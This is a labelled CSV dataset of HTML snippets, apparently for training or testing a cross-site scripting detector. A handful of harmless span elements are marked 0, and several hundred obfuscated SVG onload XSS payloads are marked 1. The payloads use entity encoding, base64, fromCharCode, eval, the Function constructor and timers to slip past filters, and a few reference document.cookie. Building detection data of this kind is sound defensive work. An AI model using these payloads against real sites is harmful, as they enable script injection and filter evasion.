"<span title=""world"">benign</span>",0
"<span title=""world"">content</span>",0
"<span title=""world"">sample</span>",0
"<span title=""world"">test</span>",0
"<span title=""world"">world</span>",0
"<svg onload=""&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"">",1
"<svg onload=""&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"">",1
"<svg onload=""&#x2f;&#x2a;some&#x2a;&#x2f;&#x61lert('XSS')"">",1
"<svg onload=""&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"">",1
"<svg onload=""&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#49;&#x29;"">",1
"<svg onload=""&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"">",1
"<svg onload=""&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"">",1
"<svg onload=""&#x61;&#x6c;&#x65;&#x72;&#x74;(&#x27;XSS&#x27;)"">",1
"<svg onload=""&#x65;&#118;&#97;&#x6c;(unescape('%61%6c%65%72%74(%27%58%53%53%27)'))"">",1
"<svg onload=""&#x65;&#x76;&#x61;&#x6c;(`al\x65rt(1)`)""></svg>",1
"<svg onload=""&#x65v&#x61l(atob('YWxlcnQod2luZG93LmFsZXJ0KDEpKQ=='))"">",1
"<svg onload=""&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"">",1
"<svg onload=""(() => {eval('ale' + 'rt(1)')})()"">",1
"<svg onload=""(()=>{const a='al'+'ert';window[a]('XSS')})()"">",1
"<svg onload=""(new Function('al'+'ert(1)'))()"">",1
"<svg onload=""(new Function('ale'+'rt(1)'))()""></svg>",1
"<svg onload=""Function('ale'+'rt(1)')()""></svg>",1
"<svg onload=""\u0065\u0076\u0061\u006C('\x61\x6C\x65\x72\x74(7)')"">",1
"<svg onload=""a=String.fromCharCode,f=(x)=>eval(x);f(a(97,108,101,114,116,40,39,88,83,83,39,41))""></svg>",1
"<svg onload=""at='',[...'hello'].map((x,y)=>at+=String.fromCharCode(x.charCodeAt()*2-y)),alert(at)""></svg>",1
"<svg onload=""document.location=`javascript:alert\`XSS\``"">",1
"<svg onload=""document.write('<scr'+'ipt>alert(1)</scr'+'ipt>')"">",1
"<svg onload=""eval(&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;)"">",1
"<svg onload=""eval('&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;')"">",1
"<svg onload=""eval('al'+'ert(1)')""></svg>",1
"<svg onload=""eval('alert(1)')"">",1
"<svg onload=""eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))"">",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,39,49,39,41))"">",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"">",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))"">",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></svg>",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,51,41))"">",1
"<svg onload=""eval(String['f'+'r'+'o'+'m'+'C'+'h'+'a'+'r'+'C'+'o'+'d'+'e'](97,108,101,114,116,40,39,88,83,83,39,41))"">",1
"<svg onload=""eval(String['fr'+'omC'+'harC'+'ode'](97,108,101,114,116,40,39,88,83,83,39,41))"">",1
"<svg onload=""eval(String['fr'+'omCh'+'arCo'+'de'](97,108,101,114,116,40,39,88,83,83,39,41))"">",1
"<svg onload=""eval(atob(&#39;YWxlcnQoMSk=&#39;))"">",1
"<svg onload=""eval(atob('YWxlcnQoJ1hTUyc=')+String.fromCharCode(41))"">",1
"<svg onload=""eval(atob('YWxlcnQoJ1hTUycp'))"">",1
"<svg onload=""eval(atob('YWxlcnQoJzEnKQ=='))"">",1
"<svg onload=""eval(atob('YWxlcnQoMSk='))"">",1
"<svg onload=""eval(atob('YWxlcnQoMSk='))""></svg>",1
"<svg onload=""eval(atob('YWxlcnQoMTExKQ=='))"">",1
"<svg onload=""eval(atob('YWxlcnQoMTIzKQ=='))"">",1
"<svg onload=""eval(atob('YWxlcnQoMzIp'))"">",1
"<svg onload=""eval(atob('YWxlcnQoNzAp'))"">",1
"<svg onload=""eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))"">",1
"<svg onload=""eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))""></svg>",1
"<svg onload=""eval(unescape('%61%6C%65%72%74%28%22XSS%22%29'))"">",1
"<svg onload=""eval(unescape('%61%6C%65%72%74%28%31%29'))"">",1
"<svg onload=""eval(unescape('%61%6C%65%72%74%28%34%29'))"">",1
"<svg onload=""eval(unescape('%61%6c%65%72%74%28%31%29'))"">",1
"<svg onload=""eval(unescape('%61%6c%65%72%74%28%31%29'))""></svg>",1
"<svg onload=""eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))"">",1
"<svg onload=""fetch('data:text/javascr'+'ipt;base64,YWxlcnQoMSk=', {mode:'no-cors'}).then(r=>r.text().then(eval))"">",1
"<svg onload=""fetch('data:text/plain;base64,YWxlcnQoMSk=').then(r=>r.text()).then(eval)""></svg>",1
"<svg onload=""let x = this.constructor; x.constructor('alert\u00281\u0029')()"">",1
"<svg onload=""location='javas'+'cript:al'+'ert(1)'"">",1
"<svg onload=""new Function(&#39;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#39;)()"">",1
"<svg onload=""new Function(&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;)()"">",1
"<svg onload=""new Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",1
"<svg onload=""new Function('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')()"">",1
"<svg onload=""new Function('\u0061\x6C\x65\x72\x74(10)')()"">",1
"<svg onload=""new Function('a','alert(a)')(1)"">",1
"<svg onload=""new Function('al'+'ert(1)')()"">",1
"<svg onload=""new Function('ale'+'rt(1)')()""></svg>",1
"<svg onload=""new Function('alert(1)')()"">",1
"<svg onload=""new Function('eval(unescape(&quot;%61%6c%65%72%74%28%27%58%53%53%27%29&quot;))')()"">",1
"<svg onload=""new Function('w',`w=window['\\u0061l\\u0065rt'](35)`)(window)""></svg>",1
"<svg onload=""new Function(`\\u0061lert(1)`)()"">",1
"<svg onload=""new Function(atob('YWxlcnQoJzEnKQ=='))()"">",1
"<svg onload=""new Function(atob('YWxlcnQoMSk='))()"">",1
"<svg onload=""new Function(unescape('%61%6c%65%72%74(1)'))()"">",1
"<svg onload=""set&#84;imeout(&#39;&#97;lert&#40;/XSS/\&#41;&#39;)"">",1
"<svg onload=""setInterval('al'+String.fromCharCode(101,114,116)+'(1)',1000)"">",1
"<svg onload=""setInterval(function(){ale&#114;t('XSS')},1000)"">",1
"<svg onload=""setTimeout(&quot;&#97;&#108;&#101;&#114;&#116&#40;1&#41;&quot;,0)"">",1
"<svg onload=""setTimeout('al'+'ert(1)')"">",1
"<svg onload=""setTimeout('al'+'ert(1)',0)"">",1
"<svg onload=""setTimeout('al'+'ert(123)',0)"">",1
"<svg onload=""setTimeout('ale'+'rt(1)',0)"">",1
"<svg onload=""setTimeout('ale'+'rt(1)',0)""></svg>",1
"<svg onload=""setTimeout('ale'+'rt(1)',1)""></svg>",1
"<svg onload=""setTimeout('alert(1)', 0)"">",1
"<svg onload=""setTimeout('alert(String.fromCharCode(88,83,83))',0)"">",1
"<svg onload=""setTimeout('eval(atob(\'YWxlcnQoMSk=\'))', 0)""></svg>",1
"<svg onload=""setTimeout('eval(atob(`YWxlcnQoJ1hTUycp`))',0)"">",1
"<svg onload=""setTimeout('window[&quot;al&quot;+&quot;ert&quot;](1)',0)"">",1
"<svg onload=""setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)"">",1
"<svg onload=""setTimeout(() => window['al'+'ert'](1), 0)"">",1
"<svg onload=""setTimeout(() => window[atob('YWxlcnQ=')](1),0)"">",1
"<svg onload=""setTimeout(() => {alert('XSS')}, 1)"">",1
"<svg onload=""setTimeout(()=>window['al'+'ert'](1),0)"">",1
"<svg onload=""setTimeout(()=>{alert(String.fromCharCode(49,49,49))},0)""></svg>",1
"<svg onload=""setTimeout(()=>{const e=Function;new e('ale'+'rt(1)')()},0)"">",1
"<svg onload=""setTimeout(()=>{eval(atob('YWxlcnQoMSk='))},0)""></svg>",1
"<svg onload=""setTimeout(()=>{let e=unescape('%61%6c%65%72%74%28%31%29');eval(e)},0)"">",1
"<svg onload=""setTimeout(()=>{window['al'+'ert'](1)},0)"">",1
"<svg onload=""setTimeout(()=>{window[`al`+`ert`](49)},0)""></svg>",1
"<svg onload=""setTimeout(Function('al'+'ert(1)'),0)"">",1
"<svg onload=""setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)"">",1
"<svg onload=""setTimeout(`&#x61;lert(1)`,0)"">",1
"<svg onload=""setTimeout(`al${'ert'}(1)`,0)"">",1
"<svg onload=""setTimeout(atob('YWxlcnQoMSk='),0)"">",1
"<svg onload=""setTimeout(decodeURIComponent('%61%6c%65%72%74(1)'),0)"">",1
"<svg onload=""setTimeout(function(){&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;},0)"">",1
"<svg onload=""setTimeout(function(){al&#101;rt(123)},0)"">",1
"<svg onload=""setTimeout(function(){aler&#116;(&#34;X&#83;&#83;&#34;)})"">",1
"<svg onload=""setTimeout(function(){eval(&#39;&#97;&#108;&#101;&#114;&#116;(1)&#39;)},0)"">",1
"<svg onload=""setTimeout(function(){let a=atob('YWxlcnQoMSk=');eval(a)},0)"">",1
"<svg onload=""setTimeout(function(){window['al'+'ert']('XSS')},0)"">",1
"<svg onload=""setTimeout(function(){window['al'+'ert'](1)},0)"">",1
"<svg onload=""setTimeout(unescape('%61%6c%65%72%74(1)'),0)"">",1
"<svg onload=""this.constructor.constructor('al'+'ert(1)')()"">",1
"<svg onload=""this.removeAttribute('onload');eval(atob('YWxlcnQoMSk='))""></svg>",1
"<svg onload=""this.src=&#34;d&#34;;eval(atob(&#39;YWxlcnQoMCk=&#39;))"">",1
"<svg onload=""this['\x6f\x6e\x6c\x6f\x61\x64']=(function(){let a=unescape('%61%6c%65%72%74%28%31%29');eval(a)}())"">",1
"<svg onload=""this['\x6f\x6eload']=null;window['\x61l\x65rt'](1)"">",1
"<svg onload=""this['r'+'emove']();&#x61;&#x6c;&#x65;&#x72;&#x74;(`18`)"">",1
"<svg onload=""top['\x65v\x61l'](String.fromCharCode(97,108,101,114,116,40,49,41))"">",1
"<svg onload=""top['alert'](1)"">",1
"<svg onload=""window&#91;&#39;&#97;&#x6c;&#x65;&#x72;&#x74;&#39;&#93;&#x28;&#x31;&#x29;"">",1
"<svg onload=""window.setTimeout('alert(String.fromCharCode(88,83,83))',0)"">",1
"<svg onload=""window[&quot;al&quot;+&quot;ert&quot;](1)"">",1
"<svg onload=""window['\u0061\u006c\u0065\u0072\u0074'](1)""></svg>",1
"<svg onload=""window['\u0061l\x65rt'](1)"">",1
"<svg onload=""window['\u0065\u0076\u0061\u006c']('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')"">",1
"<svg onload=""window['\x61'+'\x6c'+'\x65'+'\x72'+'\x74'](1)"">",1
"<svg onload=""window['\x61l\x65rt'](1)"">",1
"<svg onload=""window['\x65val']('\x61\x6c\x65\x72\x74\x28\x31\x29')"">",1
"<svg onload=""window['al'+'\u0065rt'](1)"">",1
"<svg onload=""window['al'+'ert']('XSS')"">",1
"<svg onload=""window['al'+'ert'](1)"">",1
"<svg onload=""window['al'+'ert'](String.raw`1`)"">",1
"<svg onload=""window['al'+String.fromCharCode(101)+'rt'](13)""></svg>",1
"<svg onload=""window['al\x65rt'](1)"">",1
"<svg onload=""window['ale'+'rt'](1)""></svg>",1
"<svg onload=""window['ale'+'rt'](123)"">",1
"<svg onload=""window[String.fromCharCode(97,108,101,114,116)](1)"">",1
"<svg onload=""window[`\u0061lert`](1)"">",1
"<svg onload=""window[atob('YWxlcnQ=')](1)"">",1
"<svg onload=""window[atob('YWxlcnQ=')](123)"">",1
"<svg onload=""window[decodeURIComponent('%61%6c%65%72%74')](1)"">",1
"<svg onload=""window[unescape('%61%6c%65%72%74')](1)"">",1
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#66;&#39;&#41;>,1
<svg onload=&#97;&#x6c;&#x65;&#x72;&#x74;(1)></svg>,1
<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;'>,1
<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#104;&#105;&#33;&#96;&#41;'>,1
<svg onload='&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#88;&#83;&#83;&#96;&#41;'></svg>,1
<svg onload='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;'>,1
<svg onload='&#x61;&#x6C;&#x65;&#x72;&#x74;`1`'>,1
<svg onload='&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;'>,1
<svg onload='&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)'>,1
"<svg onload='((()=>{})[""constructor""](""al""+""ert(2)"")())'></svg>",1
"<svg onload='((function(){})[""constructor""](""al""+""ert(25)"")())'></svg>",1
"<svg onload='(function(){var a=String;window[a.fromCharCode(97,108,101,114,116)](1)})()'></svg>",1
"<svg onload='(new Function(""al""+""ert(21)""))()'></svg>",1
"<svg onload='(new Function(""alert(42)""))()'>",1
"<svg onload='(new Function(""return eval""))()(decodeURIComponent(""%61%6c%65%72%74%28%31%29""))'></svg>",1
"<svg onload='(new Function(""return window""))()[[""al"",""ert""].join("""")](1)'></svg>",1
"<svg onload='Function(""al"" + ""ert(30)"")()'>",1
"<svg onload='Function(""al""+""ert(1)"")()'></svg>",1
"<svg onload='Function(""al""+""ert(27)"")()'></svg>",1
"<svg onload='Function(""alert(46)"")()'>",1
"<svg onload='Function(""return ale""+""rt"")()(""1"")'>",1
<svg onload='Function(&#39;al&#39;+&#39;ert(11)&#39;)()'></svg>,1
<svg onload='alert&#40;1&#41;'></svg>,1
"<svg onload='ev\u0061l(String.fromC\u0068arCode(97,108,101,114,116,40,39,88,83,83,39,41))'>",1
"<svg onload='eval((()=>{const a=""alert"";return a+""(1)"";})())'>",1
"<svg onload='eval(Function(""return String.fromCharCode(97,108,101,114,116,40,49,41)"")())'>",1
"<svg onload='eval(Function(""return \\u0061\\u006c\\u0065\\u0072\\u0074(1)"")())'>",1
"<svg onload='eval(Function(`return unescape`)()(""%61%6c%65%72%74(1)""))'></svg>",1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74).concat(String.fromCharCode(0x28,0x31,0x30,0x30,0x29)))'>",1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'>",1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'></svg>",1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,39,88,83,83,39,41))'>",1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))'></svg>",1
<svg onload='eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(39)+String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83)+String.fromCharCode(39)+String.fromCharCode(41))'>,1
<svg onload='eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))'></svg>,1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))'>",1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116).concat(String.fromCharCode(40,49,50,51,41)))'>",1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'>",1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>",1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,54,41))'>",1
<svg onload='eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)'></svg>,1
"<svg onload='eval(atob(""YWxlcnQoIlhTUyIp""))'>",1
"<svg onload='eval(atob(""YWxlcnQoJ1hTUycp""))'>",1
"<svg onload='eval(atob(""YWxlcnQoJzEwMCcp""))'>",1
"<svg onload='eval(atob(""YWxlcnQoJzEyMycp""))'>",1
"<svg onload='eval(atob(""YWxlcnQoMSk=""))'>",1
"<svg onload='eval(atob(""YWxlcnQoMSk=""))'></svg>",1
"<svg onload='eval(atob(""YWxlcnQoMTAwKQ==""))'>",1
"<svg onload='eval(atob(""YWxlcnQoMTExKQ==""))'>",1
"<svg onload='eval(atob(""YWxlcnQoMTIzKQ==""))'>",1
"<svg onload='eval(atob(""YWxlcnQoMTQp""))'>",1
"<svg onload='eval(atob(""d2luZG93LmFsZXJ0KDEp""))'></svg>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74%28%27%58%53%53%27%29""))'>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74%28%31%29""))'>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74%28%31%29""))'></svg>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74%28%31%31%31%29""))'>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74(1)""))'>",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74(1)""))'></svg>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74%28%27%58%53%53%27%29""))'>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74%28%31%29""))'>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74%28%31%31%31%29""))'>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74%28%31%32%33%29""))'>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74(1)""))'></svg>",1
"<svg onload='eval(window.atob(""YWxlcnQoIlhTUyIp""))'>",1
"<svg onload='fetch(`data:text/javascript,al%65rt(1)`).then(res=>res.text()).then(eval)'>",1
"<svg onload='new Function(""\\u0061\\u006c\\u0065\\u0072\\u0074(1)"")()'></svg>",1
"<svg onload='new Function(""al"" + ""ert(10)"")()'>",1
"<svg onload='new Function(""al""+""ert(1)"")()'></svg>",1
"<svg onload='new Function(""ale""+""rt(1)"")()'></svg>",1
"<svg onload='new Function(""eval(String.fromCharCode(97,108,101,114,116,40,49,41))"")()'></svg>",1
"<svg onload='new Function(""return al""+""ert(1)"")()'></svg>",1
"<svg onload='new Function(atob(""YWxlcnQoMSk=""))()'></svg>",1
"<svg onload='setInterval(""\u0061\u006c\u0065\u0072\u0074(1)"",1)'>",1
"<svg onload='setInterval(() => alert(1), 1000)'>",1
"<svg onload='setInterval(function(){alert(1)}, 1000)'>",1
"<svg onload='setTimeout(""\u0061\u006c\u0065\u0072\u0074(1)"",0)'>",1
"<svg onload='setTimeout(() => eval(""&#97;&#108;&#101;&#114;&#116;(22)""), 0)'>",1
"<svg onload='setTimeout(() => window[""al""+""ert""](50), 0)'>",1
"<svg onload='setTimeout(() => {eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)'></svg>",1
"<svg onload='setTimeout(Function(&#96;al&#101;rt(16)&#96;),0)'></svg>",1
"<svg onload='setTimeout(String.fromCharCode(97,108,101,114,116).concat(""("",49,49,49,"")""))'>",1
"<svg onload='setTimeout(`alert(1)`, 0)'>",1
"<svg onload='setTimeout(`eval(String.fromCharCode(97,108,101,114,116,40,49,41))`,0)'></svg>",1
"<svg onload='setTimeout(function(){alert(1)}, 0)'>",1
"<svg onload='setTimeout(function(){eval(""al""+""ert(23)"")},0)'></svg>",1
"<svg onload='setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)'></svg>",1
"<svg onload='setTimeout(function(){eval(atob(""YWxlcnQoMSk=""));},0)'>",1
"<svg onload='setTimeout(function(){window[String.fromCharCode(97,108,101,114,116)](1)},0)'></svg>",1
<svg onload='this.remove();&#97;&#108;&#101;&#114;&#116;(`2`)'>,1
"<svg onload='this.remove();eval(atob(""YWxlcnQoMTExKQ==""))'>",1
"<svg onload='this.removeAttribute(String.fromCharCode(111,110,108,111,97,100));eval(atob(""YWxlcnQoIlhTUyIp""))'>",1
"<svg onload='window.setTimeout(String.fromCharCode(97,108,101,114,116,40,56,41),0)'></svg>",1
"<svg onload='window[""\u0061\u006c\u0065\u0072\u0074""](1)'></svg>",1
"<svg onload='window[""\x61\x6c\x65\x72\x74""](""\x58\x53\x53"")'>",1
"<svg onload='window[""\x61\x6c\x65\x72\x74""](1)'></svg>",1
"<svg onload='window[""\x65\x76\x61\x6c""](""\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29"")'>",1
"<svg onload='window[""al""+""ert""](""1"")'>",1
"<svg onload='window[""al""+""ert""](1)'>",1
"<svg onload='window[""al""+""ert""](1)'></svg>",1
"<svg onload='window[""al""+""ert""](18)'></svg>",1
"<svg onload='window[""al""+""ert""](38)'>",1
"<svg onload='window[""al""+""ert""](String.fromCharCode(50,54))'>",1
"<svg onload='window[""al""+""ert""](`1`)'>",1
"<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>",1
"<svg onload='window[atob(""YWxlcnQ="")](1)'></svg>",1
"<svg onload='window[eval(atob(""d2luZG93LmFsZXJ0KDEp""))]'></svg>",1
<svg onload=Function('\u0061\u006c\u0065\u0072\u0074(38)')()>,1
<svg onload=Function('\u0061lert(1)')()></svg>,1
<svg onload=Function('al'+'ert(1)')()>,1
<svg onload=Function('al'+'ert(1)')()></svg>,1
<svg onload=Function('al'+'ert(14)')()>,1
"<svg onload=Function('window[""al""+""ert""](1)')()></svg>",1
<svg onload=Function(atob('cmV0dXJuIGFsZXJ0'))()(1)>,1
<svg onload=\u0061\u006c\u0065\u0072\u0074(2)>,1
"<svg onload=eval(""al&#101rt(1)"")>",1
"<svg onload=eval(""al\u0065rt(1)"")>",1
<svg onload=eval(&#x61;&#x6c;&#x65;&#x72;&#x74;(1))></svg>,1
<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>,1
<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>,1
"<svg onload=eval(''.concat('a','l','e','r','t')+'(1)')>",1
"<svg onload=eval(''.concat('aler','t(1)'))></svg>",1
<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')>,1
<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(1)')></svg>,1
<svg onload=eval('\u0061\u006c\u0065\u0072\u0074(34)')>,1
<svg onload=eval('\u0061l\u0065rt\u0028\u0027XSS\u0027\u0029')>,1
<svg onload=eval('\u0061lert(1)')></svg>,1
<svg onload=eval('\u0061lert(3)')>,1
<svg onload=eval('\u0061lert(5)')>,1
<svg onload=eval('\x61\x6c\x65\x72\x74(1)')>,1
"<svg onload=eval('a'+String.fromCharCode(108,101,114,116)+'(1)')>",1
<svg onload=eval('a\x6Cert(1)')>,1
<svg onload=eval('al'+'ert(1)')>,1
<svg onload=eval('al'+'ert(1)')></svg>,1
<svg onload=eval('al'+'ert(10)')>,1
"<svg onload=eval('al'+String.fromCharCode(101,114,116)+'(1)')>",1
<svg onload=eval('al\x65rt(0x7b)')>,1
<svg onload=eval('al\x65rt(111)')>,1
"<svg onload=eval('wind'+'ow[""al""+""ert""](123)')>",1
"<svg onload=eval('window[""a""+""lert""]')(1)>",1
"<svg onload=eval('window[String.fromCharCode(97,108,101,114,116)](1)')>",1
"<svg onload=eval(String.fromCharCode(...[97,108,101,114,116,40,49,41]))>",1
<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(1)')>,1
<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(111)')>,1
"<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)+'(1)')>",1
"<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>",1
"<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(101,118,97,108)+String.fromCharCode(40,97,108,101,114,116,40,49,41,41))>",1
"<svg onload=eval(String.fromCharCode(101,118,97,108,40,39,97,108,101,114,116,40,49,41,39,41))></svg>",1
"<svg onload=eval(String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,39,88,83,83,39,41))>",1
"<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,32,46,32,97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>",1
<svg onload=eval(String.fromCharCode(97)+'lert(1)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(111)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(2)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(4)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(5)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.cookie)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.domain)')>,1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>,1
"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101,114,116,40,49,41))></svg>",1
"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101)+String.fromCharCode(114,116,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41))>",1
